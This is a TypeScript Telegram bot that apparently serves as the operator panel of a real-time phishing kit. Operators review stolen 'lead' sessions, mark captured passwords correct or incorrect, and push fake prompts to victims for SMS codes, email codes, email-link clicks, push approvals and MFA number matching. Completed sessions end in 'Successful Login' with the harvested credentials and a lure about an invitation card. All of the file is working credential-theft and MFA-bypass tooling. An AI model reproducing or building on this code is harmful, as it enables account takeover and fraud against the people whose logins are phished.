import { Bot } from "grammy";
import type { UserFromGetMe } from "grammy/types";
import { Redis } from "@upstash/redis";
import {
  restartLeadSession,
  updateLeadSession,
} from "../methods/lead.methods.js";
import { InlineKeyboard } from "grammy";
import {
  callbackActions,
  reviewCallbackData,
  callbackPatterns,
} from "../methods/callback.methods.js";
import { composeTelegramMessage } from "../methods/message.methods.js";
import {
  buildSessionOptions,
  renderSessionCard,
} from "../methods/session.methods.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID?.trim();
const DEPLOYMENT_VERSION = parseFloat(process.env.DEPLOYMENT_VERSION || "0.0");
const EXPECTED_DEPLOYMENT_VERSION = 1.0;

if (!TELEGRAM_BOT_TOKEN)
  throw new Error("Missing Telegram bot token environment variable.");

const redis = Redis.fromEnv();
const botId = TELEGRAM_BOT_TOKEN.split(":")[0];
const chkey = `telegram:botinfo:${botId}`;
let initPromise: Promise<void> | null = null;

export const bot = new Bot(TELEGRAM_BOT_TOKEN);

async function sendTelegramError(message: string): Promise<void> {
  if (!TELEGRAM_CHAT_ID) return;
  try {
    await bot.api.sendMessage(
      TELEGRAM_CHAT_ID,
      `🚨 Deployment error\n\n${message}`,
    );
  } catch (error) {
    console.error("Failed to send deployment error to Telegram:", error);
  }
}

export function ensureBotInitialized(): Promise<void> {
  if (DEPLOYMENT_VERSION < EXPECTED_DEPLOYMENT_VERSION) {
    const message = `Deployment version ${DEPLOYMENT_VERSION} is older than the expected version ${EXPECTED_DEPLOYMENT_VERSION}. Telegram updates are paused.`;
    console.error(message);
    void sendTelegramError(message);
    return Promise.resolve();
  }
  if (bot.isInited()) return Promise.resolve();
  if (initPromise) return initPromise;
  initPromise = (async () => {
    const cached = await redis.get<UserFromGetMe>(chkey);
    if (cached) {
      bot.botInfo = cached;
      return;
    }
    await bot.init();
    await redis.set(chkey, bot.botInfo, { ex: 60 * 60 * 24 * 7 });
  })().catch((err) => {
    initPromise = null;
    throw err;
  });
  return initPromise;
}

export async function broadcastBotCommands(): Promise<void> {
  await bot.api.setMyCommands([
    {
      command: "whoami",
      description: "See your Telegram user Info.",
    },
  ]);
}

bot.catch((err) => {
  console.error("Unhandled bot error:", err.error);
});

bot.command("whoami", async (context) => {
  const userId = context.from?.id;
  const chatId = context.chat?.id;
  const username = context.from?.username;
  const firstName = context.from?.first_name;
  const lastName = context.from?.last_name;
  if (userId === undefined || chatId === undefined) return;
  await context.reply(
    [
      `User ID - ${userId}`,
      `Chat ID - ${chatId}`,
      username && `Username - ${username}`,
      firstName && `First Name - ${firstName}`,
      lastName && `Last Name - ${lastName}`,
    ].join("\n\n"),
    {
      reply_markup: new InlineKeyboard()
        .copyText(`${userId}`, `${userId}`)
        .copyText(`${chatId}`, `${chatId}`)
        .primary(),
    },
  );
});

bot.callbackQuery(callbackPatterns.auth, async (context) => {
  const [, sessionId, action] = context.match;
  const pass = action === "pass";
  await context.answerCallbackQuery({
    text: pass ? "Approving authentication." : "Rejecting authentication.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: pass ? "passing" : "flagged",
      process: "auth",
      feedback: pass
        ? "Proceeding to the next step..."
        : action === "flag"
          ? "Password is incorrect. Please try again."
          : `Invalid account. Try again with a different email address.`,
      logEntry: composeTelegramMessage(
        pass ? "✅ Correct credentials" : "❌ Invalid credentials",
        pass ? "🚀 Select what's next" : undefined,
      ),
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    if (pass) {
      await renderSessionCard(
        context,
        sessionId,
        session,
        buildSessionOptions(sessionId, session),
      );
    } else {
      await renderSessionCard(
        context,
        sessionId,
        session,
        new InlineKeyboard(),
      );
    }
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.code, async (context) => {
  const [, anchor, type] = context.match;
  const typeName = type === "sms" ? "SMS code" : "email code";
  await context.answerCallbackQuery({
    text: `Sending ${typeName} verification request...`,
  });
  try {
    const session = await updateLeadSession(anchor, {
      status: "idle",
      process: type === "sms" ? "verify-sms-code" : "verify-email-code",
      feedback:
        type === "sms"
          ? "Enter the verification code sent to your mobile phone."
          : "Enter the verification code sent to your email address.",
      logEntry: `🏹 Sent ${typeName} verification request`,
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      anchor,
      session,
      new InlineKeyboard()
        .text(
          `Resend ${typeName}`,
          reviewCallbackData(
            anchor,
            type === "sms"
              ? callbackActions.smsCode
              : callbackActions.emailCode,
          ),
        )
        .primary(),
      composeTelegramMessage(session.logs),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.codeDecision, async (context) => {
  const [, sessionId, type, action] = context.match;
  const typeName = type === "sms" ? "SMS code" : "email code";
  const pass = action === "pass";
  await context.answerCallbackQuery({
    text: pass
      ? `Approving ${typeName} verification request.`
      : `Rejecting ${typeName} verification request.`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: pass ? "passing" : "flagged",
      process: type === "sms" ? "verify-sms-code" : "verify-email-code",
      feedback:
        type === "sms"
          ? pass
            ? "Proceeding to the next step..."
            : "The SMS code you entered is incorrect or has expired."
          : pass
            ? "Proceeding to the next step..."
            : "The email code entered is incorrect or has expired.",
      overload: pass ? [`${type}-code`] : undefined,
      logEntry: pass ? `✅ Correct ${typeName}` : `❌ Invalid ${typeName}`,
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    if (pass) {
      await renderSessionCard(
        context,
        sessionId,
        session,
        buildSessionOptions(sessionId, session),
        composeTelegramMessage(session.logs, "🚀 Select what's next"),
      );
    } else {
      await renderSessionCard(
        context,
        sessionId,
        session,
        new InlineKeyboard()
          .text(
            `Resend ${typeName}`,
            reviewCallbackData(
              sessionId,
              type === "sms"
                ? callbackActions.smsCode
                : callbackActions.emailCode,
            ),
          )
          .primary(),
        composeTelegramMessage(session.logs),
      );
    }
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.emailLink, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: `Sending email link verification request...`,
  });
  try {
    const channel = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-email-link",
      feedback:
        "Please check your inbox and click the verification link we sent you.",
      logEntry: "🏹 Sent email link verification request",
    });
    if (!channel) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      channel,
      new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          reviewCallbackData(sessionId, callbackActions.verifyLinkApprove),
        )
        .success(),
      composeTelegramMessage(channel.logs),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.emailLinkApprove, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: "Approving email link verification request.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "passing",
      process: "verify-email-link",
      feedback: "Proceeding to the next step...",
      overload: ["email-link"],
      logEntry: "✅ Email Link Clicked",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      session,
      buildSessionOptions(sessionId, session),
      composeTelegramMessage(session.logs, "🚀 Select what's next"),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptYes, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: `Sending prompt yes verification request...`,
  });
  try {
    const channel = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-prompt-yes",
      feedback: "Yes",
      logEntry: "🏹 Sent prompt yes verification request",
    });
    if (!channel) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      channel,
      new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          reviewCallbackData(sessionId, callbackActions.verifyPromptYesApprove),
        )
        .success(),
      composeTelegramMessage(channel.logs),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptYesApprove, async (context) => {
  const [, anchor] = context.match;
  await context.answerCallbackQuery({
    text: "Approving prompt yes verification request.",
  });
  try {
    const session = await updateLeadSession(anchor, {
      status: "passing",
      process: "verify-prompt-yes",
      feedback: "Proceeding to the next step...",
      overload: ["prompt-yes"],
      logEntry: "✅ Prompt Yes Successful",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      anchor,
      session,
      buildSessionOptions(anchor, session),
      composeTelegramMessage(session.logs, "🚀 Select what's next"),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNum, async (context) => {
  const [, anchor] = context.match;
  await context.answerCallbackQuery();
  try {
    const channel = await updateLeadSession(anchor, {
      status: "loading",
      feedback: "Sending to notification to your mobile phone...",
      logEntry: "📍 Select the number they need to tap",
    });
    if (!channel) throw new Error("Invalid sessionId or expired session.");
    let keyboard = new InlineKeyboard();
    for (let i = 1; i < 100; i++) {
      keyboard = keyboard.text(
        `${i}`,
        reviewCallbackData(anchor, callbackActions.promptNumValue(i)),
      );
      if (i % 2 === 0) keyboard = keyboard.primary();
      if (i % 5 === 0) keyboard = keyboard.row();
    }
    await renderSessionCard(
      context,
      anchor,
      channel,
      keyboard,
      composeTelegramMessage(channel.logs),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNumValue, async (context) => {
  const [, sessionId, number] = context.match;
  await context.answerCallbackQuery({
    text: `Sending prompt num verification request...`,
  });
  try {
    const channel = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-prompt-num",
      feedback: `${number}`,
      logEntry: "🏹 Sent prompt num verification request",
    });
    if (!channel) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      channel,
      new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          reviewCallbackData(sessionId, callbackActions.verifyPromptNumApprove),
        )
        .success(),
      composeTelegramMessage(channel.logs),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNumApprove, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: "Approving prompt num verification request.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "passing",
      process: "verify-prompt-num",
      feedback: "Proceeding to the next step...",
      overload: ["prompt-num"],
      logEntry: "✅ Prompt Number Successful",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      session,
      buildSessionOptions(sessionId, session),
      composeTelegramMessage(session.logs, "🚀 Select what's next"),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.complete, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({ text: "Completing..." });
  try {
    const channel = await updateLeadSession(sessionId, {
      status: "completed",
      process: "init",
      feedback:
        "We've sent your invitation card to your email address. " +
        "Stay tunned for follow up instructions.",
    });
    if (!channel) throw new Error("Invalid sessionId or expired session.");
    await renderSessionCard(
      context,
      sessionId,
      channel,
      new InlineKeyboard().text(
        "Restart",
        reviewCallbackData(sessionId, callbackActions.restart),
      ),
      composeTelegramMessage(channel.credentials, "🔐 Successful Login"),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.restart, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({ text: "Restarting..." });
  try {
    const session = await restartLeadSession(sessionId, {
      keepMessageId: true,
      keepState: true,
      status: "idle",
    });
    await renderSessionCard(
      context,
      sessionId,
      session,
      new InlineKeyboard(),
      composeTelegramMessage(session.logs, "🔄 Restarted Session"),
    );
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});
